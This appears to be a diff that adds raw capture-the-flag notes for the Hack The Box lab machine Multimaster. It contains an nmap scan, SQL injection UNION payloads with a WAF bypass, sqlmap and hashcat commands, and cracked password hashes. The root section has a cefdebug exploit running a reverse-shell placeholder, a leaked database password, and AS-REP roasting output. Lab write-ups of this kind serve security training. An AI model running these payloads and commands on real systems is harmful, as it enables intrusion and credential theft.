@@ -1,0 +1,166 @@
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-10 20:23 EDT
+Stats: 0:07:05 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 60.19% done; ETC: 20:34 (0:04:41 remaining)
+Nmap scan report for multimaster.htb (10.10.10.179)
+Host is up (0.065s latency).
+Not shown: 65516 filtered ports
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: MegaCorp
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-09-11 00:49:54Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: MEGACORP
+|   NetBIOS_Domain_Name: MEGACORP
+|   NetBIOS_Computer_Name: MULTIMASTER
+|   DNS_Domain_Name: MEGACORP.LOCAL
+|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
+|   DNS_Tree_Name: MEGACORP.LOCAL
+|   Product_Version: 10.0.14393
+|_  System_Time: 2020-09-11T00:52:17+00:00
+| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
+| Not valid before: 2020-09-10T00:15:12
+|_Not valid after:  2021-03-12T00:15:12
+|_ssl-date: 2020-09-11T00:52:55+00:00; +13m04s from scanner time.
+9389/tcp  open  mc-nmf        .NET Message Framing
+49666/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49675/tcp open  msrpc         Microsoft Windows RPC
+49681/tcp open  msrpc         Microsoft Windows RPC
+49698/tcp open  msrpc         Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=9/10%Time=5F5AC6A7%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 1h37m04s, deviation: 3h07m52s, median: 13m03s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: MULTIMASTER
+|   NetBIOS computer name: MULTIMASTER\x00
+|   Domain name: MEGACORP.LOCAL
+|   Forest name: MEGACORP.LOCAL
+|   FQDN: MULTIMASTER.MEGACORP.LOCAL
+|_  System time: 2020-09-10T17:52:20-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-09-11T00:52:18
+|_  start_date: 2020-09-11T00:15:18
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1068.33 seconds
+
+################################################################################
+FOOTHOLD
+################################################################################
+ldap first:
+ X - ldapsearch -x -h multimaster.htb -s base namingcontexts
+  X - ldapsearch -x -h multimaster.htb -s sub -b 'DC=DomainDnsZones,DC=MEGACORP,DC=LOCAL'
+
+POST /api/getColleagues HTTP/1.1
+- waf bypassed with sqlmap:
+  X - sqlmap -r r.txt -tamper=between,charencode,charunicodeencode -delay=3
+  O - compare a with \u0061 works... use utf-16
+      - figure out db:
+        - the returned json has 5 columns, so whatever we union, must have 5 columns too:
+          - ' union select '1','2','3','4', @@version --
+            - {"id":1,"name":"2","position":"3","email":"4","src":"Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) \n\tAug 22 2017 17:04:49 \n\tCopyright (C) 2017 Microsoft Corporation\n\tStandard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)\n"},
+
+--------------------------------------------------------------------------------
+sqli on mssql db with 5 column union
+--------------------------------------------------------------------------------
+encode with : https://convertcodes.com/utf16-encode-decode-convert-string/
+' UNION SELECT 'A','B','C','D',@@VERSION --
+' UNION SELECT '1','2','3','4',DB_NAME() --
+  - Hub_DB
+' UNION (SELECT '1','2','3','4','5' from colleagues)--
+  - guess colleagues bc api name
+' UNION (SELECT password,name,'3','4','5' from colleagues)--
+use: https://rextester.com/l/sql_server_online_compiler to figure out column names of the column table
+  - (select top 1 column_name,table_name,'1','2','3' from INFORMATION_SCHEMA.COLUMNS)
+  (select '1',column_name,'b','c','d' from INFORMATION_SCHEMA.COLUMNS where table_name='pilots' AND ordinal_position=1)
+a' UNION (select '1',column_name,'b','c','d' from INFORMATION_SCHEMA.COLUMNS where table_name='colleagues' AND ordinal_position=1)--
+
+turns out colleagues only has 5 columns... so we need to figure out the tables...
+use again: https://rextester.com/l/sql_server_online_compiler
+  (select * from INFORMATION_SCHEMA.TABLES)
+(select TOP 1 '1',table_name,'3','4','5' from INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE 't%')
+^ burp this and find table 'Logins'
+
+now we know table logins, db Hub_DB, now we can get columns
+  (select '1',column_name,'b','c','d' from INFORMATION_SCHEMA.COLUMNS where table_name='logins' AND ordinal_position=1)
+  ^ again in repeater
+    - id,username,password
+    - a' UNION (select id,username,password,'c','d' from logins)-- 
+      - hashes file (only 4 unique)
+      - !./hashcat-6.0.0/hashcat.bin --force -m 17900 -o 0.txt hash.txt list.txt 
+        - Keccak-384
+          9777768363a66709804f592aac4c84b755db6d4ec59960d4cee5951e86060e768d97be2d20d79dbccbe242c2244e5739:password1
+          68d1054460bf0d22cd5182288b8e82306cca95639ee8eb1470be1648149ae1f71201fbacc3edb639eed4e954ce5f0813:finance1
+          fb40643498f8318cb3fb4af397bbce903957dde8edde85051d59998aa2f244f7fc80dd2928e648465b8e7a1946a50cfa:banking1
+          - id_hash fil
+          -files: usernames, passwords
+
+use kerebrute doesnt work... get more users via sql injection
+... guess what you CAN use sqlmap:
+sqlmap -r r.txt -D 'Hub_DB' --dbms=mssql --technique=U --delay=3 --tamper=charunicodeescape --sql-query="" --hex
+'\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\x1c\x00Ѽс\xf1I+\xdf\xc26\x00\x02\x00\x00
+\x01 \x05 \x00 \x00 \x00 \x00 \x00 \x05 \x15 \x00 \x00 \x00 \x1c \x00 \xD1 \xBC \xD1 \x81 \xf1 \x49 \x2B \xdf \xc2 36 \x00 \x02 \x00 \x00
+
+https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/#enumsql
+sploit0.py
+  \x01 \x05 \x00 \x00 \x00 \x00 \x00 \x05 \x15 \x00 \x00 \x00 \x1c \x00 \xD1 \xBC \xD1 \x81 \xf1 \x49 \x2B \xdf \xc2 \x36
+  0105000000000005150000001c00D1BCD181f1492Bdfc236
+  0x0105000000000005150000001c00d1bcd181f1492bdfc236 BASE SID, need 4 bytes 0x00000000
+  user ids start at 500, make sure you append little endian store results in more_usernames
+
+try more_usernames with passwords
+
+################################################################################
+ROOT
+################################################################################
+megacorp\tushikikatomo
+https://iwantmore.pizza/posts/cve-2019-1414.html
+https://github.com/taviso/cefdebug
+  - ws://127.0.0.1:25788/64b34f61-f1bb-4b96-b37c-8cf496b3f665
+  - ws://127.0.0.1:17004/57ff8187-4086-49fc-bc79-0273f50231ef
+ ./sploit.exe --url aaaaa --code ""
+  -code is: process.mainModule.require('child_process').exec('nc to me')
+
+C:\inetpub\wwwroot\bin> cat dll files and see .server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
+sbauer works with this pass
+
+sbauer > bloodhound, sharphound > sbauer > jorden > server operator > robocopy /B
+kerberoast jorden https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/
+kali@kali:~/Downloads$ p3 GetNPUsers.py -format hashcat MEGACORP.local/jorden -no-pass -dc-ip 10.10.10.179
+Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation
+
+[*] Getting TGT for jorden
+$krb5asrep$23$jorden@MEGACORP.LOCAL:af6a40c99df3d2fc992fbb4b7ec169cb$8c6a4d5162657b518650a5f3b718ca80fcb0e4df5fb7c469a330801f64022f61e380715d6bc53cff06f62ff2eaa26ab561c00e42be6925a4338e05b32c0cb36e38f00c218e5e038d0de175d61d4ffa067476ce33cf0382b2eb8e3590dee64ba4e160b30a58e4ce3877739d1e5de0d273302de963026d6a4458e8bcb9feacaf7dbca16dae279a26724237b0834bbcf33ea79b7c23456d576a04e8189f8d754f125f416b66f8d3ae88bbb0ff0629dc9b1274610d8879fb0debd3a72d396a1553f54ce382b6f83141f26d5a6153744615ff318ec9f718bda2c05c90e208f556a735ba8b3e9c038a41501eaa0bb5f571205e
+
+jorden:rainforest786
+robocopy \B
